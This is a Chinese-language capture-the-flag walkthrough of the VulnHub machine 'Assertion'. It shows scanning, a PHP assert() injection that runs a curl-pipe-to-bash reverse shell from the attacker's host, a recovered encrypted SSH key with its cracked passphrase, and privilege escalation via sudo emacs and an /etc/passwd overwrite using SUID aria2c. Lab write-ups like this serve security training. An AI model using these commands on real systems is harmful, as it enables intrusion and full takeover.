# Assertion: 1.0.1

2024-5-25 https://www.vulnhub.com/entry/assertion-1,495/

difficulty: Intermediate

## IP

192.168.10.187

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6eceaacc02dea5a3585dda2bef5407f9 (RSA)
|   256 9d3fdf167ae15958844ae3298f44878d (ECDSA)
|_  256 87b56ff82181d33b43d04081c0e36989 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Assertion
```

80 web 首页是一个网站页面，底部显示了是 Colorlib CMS。使用 gobuster 看看有什么信息：

```
http://192.168.10.187/contact.php          (Status: 200) [Size: 11556]
http://192.168.10.187/about.php            (Status: 200) [Size: 20735]
http://192.168.10.187/pages                (Status: 301) [Size: 316] [--> http://192.168.10.187/pages/]
http://192.168.10.187/gallery.php          (Status: 200) [Size: 17070]
http://192.168.10.187/css                  (Status: 301) [Size: 314] [--> http://192.168.10.187/css/]
http://192.168.10.187/index.php            (Status: 200) [Size: 36592]
http://192.168.10.187/schedule.php         (Status: 200) [Size: 23805]
http://192.168.10.187/js                   (Status: 301) [Size: 313] [--> http://192.168.10.187/js/]
http://192.168.10.187/blog.php             (Status: 200) [Size: 15274]
http://192.168.10.187/img                  (Status: 301) [Size: 314] [--> http://192.168.10.187/img/]
http://192.168.10.187/fonts                (Status: 301) [Size: 316] [--> http://192.168.10.187/fonts/]
```

没有发下什么隐藏的提示目录或者是登陆目录。

在首页最上方的菜单中，发现了线索 http://192.168.10.187/index.php?page=about ，这里可能存在 LFI，访问 /etc/passwd 看看：

```
http://192.168.10.187/index.php?page=../../../../../../../etc/passwd
```

显示 Not so easy brother! 被嘲笑了。

经过测试，目标系统应该是对..做了检测，并且在 page 的值前加了 page/,值后加了.php,可能是这样构造的：`$file = "pages/". $page. ".php";`,然后在对 file 变量判断是否存在..特殊字符。

可能存在字符串的拼接，与 SQL 注入绕过引号进行必合一样。查找了 PHP 的 LFI 资料，可能使用 strpos 函数进行判断，尝试使用单引号进行绕过：

```
http://192.168.10.187/index.php?page=about%27.phpinfo().%27about
```

发现显示了 phpinfo 页面。

可以带入命令，得到反弹的 shell，kali 上监听 8888 端口：

```
curl "http://192.168.10.187/index.php?page=about%27.system('curl%20http://192.168.10.3/10.3/8888.sh|bash').%27about"

www-data@assertion:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

先验证下前面的判断，看看源码：

```
www-data@assertion:/var/www/html$ cat index.php

<?php
if (isset($_GET['page'])) {
  $page = $_GET['page'];
  $file = "pages/" . $page . ".php";

  // Saving ourselves from any kind of hackings and all
  assert("strpos('$file', '..') === false") or die("Not so easy brother!");
  $val = "pages/". $page;

  if(!file_exists($file)){
    die ("File does not exist");
  }
} else {
  $file = "index.php";
}
?>
```

进行系统枚举，/home 目录下有 2 个用户：fnx 和 soz，www-data 没有权限进入这 2 个用户目录。

/var/www/html 中有一个隐藏目录 .todeletelater ，里面有一个 id_rsa:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,A6E4A31EC68B52BE19B436FB9FE21BD8

2aosCPETte7rK333hu1007Fz64JLXLa+iX1IzFZGvGDiF5ykwlnQGg/PhpUqClGI
ySe/bSp+XQdD0iddR7m05PKgFpxBMR0bu2LhcUFbB9K5HCObIxQ1lHt5l4cHOiOl
ftJMDH6nMPiHJdmH0IScbTCrGHJo/1gRKZc3ZVogrhj583fQNo5cjTQdrJ7RTfE7
UwY+u9Gxvfe6yenwTUMbgG5qZX1PPWceUKuNdXoHcgHpHUa6xdGl8Ln0B4Bz8euZ
gxFkzmojCP59ZvcVIpGB+jZtgcFhHmrcKjiZjZ+FzzUZf6TZu5/Uz/b+wMNrBLVQ
ogFCEF/1aGWbmsj0j+wzBO/N4IKwHqACoXXCw059Hxre/3ZvSC9UVcj6VVVDqTg1
BFnXM28/DPDiGAG3mcoUmqwXOr3HfjWKKKmJD3huqk6xrJnh5lCS8+Xh0SDS8QGN
7z3vK62MASzM/uEbEdqsolm1hzcJv905ZC25D1RNhQGWubJA10a79D8RTEDev/c/
d2/kAIl4/yUSOrKopF8fIy6Tek2mmfHFfd3G/3vpsiY3OHesmqZXG68hgqjvTPQo
7TqODcwkrb5UgI+PyqMiPyUCrqpC+TX0yTMYaNUeFEmIhVq1ZGMs0SLbCX58uT3I
AYi8uaDkCg3ngCjO/JqVO2fvIuLkW6VhT6phnkAyXVKnRpVua/eZSr3ksG9pMI6P
Cj1jQC29+HLjrYjGAv7teiUgJx2OjNudEpEpSQeQRF5qqrWBDryR+H1002+B5Qmw
av5gM+uSWfrDmt2UMw/NylOHLGNfjr7BCksob3vvuuvkKBouJqDpSfdYFN/jMiTq
Yfl8BgOH7g/EMHRu80KBOw+2Z2xRDdN4D0mLQ0btLD0AiJN1yBbpTQCl0h3MKQbn
BLglry94vX8t7FvIiL37pMO1GfnPRdeuTDGiSohVaaqluR4mj7L7lEVvIAhy2jYt
aicgrua5YAud/+V5nw+0rCI7in3O6gYpd+9heE+rj301YrArQIlwpRsjioT5pcrv
Cjtio3PIf/U+KsN4mT0sFDR4Pb68i3CLBQzK3CpSbNG3SGq71K1CDLo90tLmgzNW
JJu9lODEpl6vC2b6KmXcrDplz9IuSVfSXRG3t7BR/Vs/vK1Y2LRelK6fICRTgJSF
iOI4YhRqtAOhgaYa2tpvrUjEL7Wi4U03A2hmT7BIuJCinog6fdja4wrfln77fs2G
IW9cxXgRZ0onuHikbB74lXBdhuLQ/RJqpdzdZScI2ReaP3VQoEIkj0Cp853bL6re
SvNCFnOqlUmWUV10VI/BuSj9yWW2+7Su1z1WQVXlCNmo4uLZ1gfXtC8pWjVe5JKw
hxCizOFZrDvcLhoNe1c3LMod1L3B2AoLnidp4hLb5pCRMUmqZOxiYNVDzAiptXzV
w/9P0w5M0eixFSECRE6jQ140eiHLxo6//yCwGckA0mDIdVDWRSPUW3r3NYW1iGaW
RLI+MyNIw9yzlH3RClyhp8X97kxEjLytc9CGh6/bvMRIB8kHCbpvsxCX8g1gnrUB
JBvgNXu2ma2RE41XyKfeigv49bEnA+bgi0laY1O3ujAqaP3S1yvBf0NOJICxy07h
-----END RSA PRIVATE KEY-----
```

应该是 fnx 或 soz 的，保存到 kali 上，尝试登陆。提示私钥有密钥，使用 john + rockyou 进行解密，得到私钥的密码:sozefasalshwamra

再次使用 ssh 尝试登陆这 2 个用户，结果 soz 能成功登陆，继续开始进行系统枚举吧，sudo -l 显示了有意思的信息：

```
(fnx) NOPASSWD: /usr/bin/emacs
```

通过 emacs 能提权到 fnx 用户：

```
cd /tmp
sudo -u fnx emacs -Q -nw --eval '(term "/bin/bash")'
```

在其他目录执行，可能提示权限不足，先切换到/tmp，全局可写，这时就能看到 bash 的图标：

```
$ id
uid=1001(fnx) gid=1001(fnx) groups=1001(fnx)

fnx@assertion:/home/fnx$ ls -al
total 24
drwxr-x--- 3 fnx  fnx  4096 Jan 16  2020 .
drwxr-xr-x 4 fnx  soz  4096 Jun 27  2020 ..
lrwxrwxrwx 1 root root    9 Jan 16  2020 .bash_history -> /dev/null
-rwsr-xr-x 1 root root 7424 Jan 16  2020 donttouchme
drwxrwxr-x 3 fnx  fnx  4096 Jan 16  2020 .local
-r-------- 1 fnx  fnx    33 Jan 16  2020 user.txt
```

得到了 user flag：

```
fnx@assertion:/home/fnx$ cat user.txt
fa7c75358229ac0cfb376286476efeef
```

查找 suid 程序，发现 /usr/bin/aria2c ，可以提权到 root。

读取目标机器的/etc/passwd，保存在 kali 上，并且在最后一行添加：

```
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

new:123,在 kali 上构造 http 服务。

在目标机器上执行，下载 passwd 文件，覆盖原有的/etc/passwd：

```
cd /etc
URL=http://192.168.10.3/passwd
LFILE=passwd
aria2c -o passwd "http://192.168.10.3/passwd" --allow-overwrite=true
```

执行后，就会覆盖原有的/etc/passwd，然后就可以用新添加的超级用户 new:123 去进入/root 目录。

得到最终的 root 权限：

```
root@assertion:~# cat root.txt
8efabdae07730bdcb14d83e37a2e7398
```
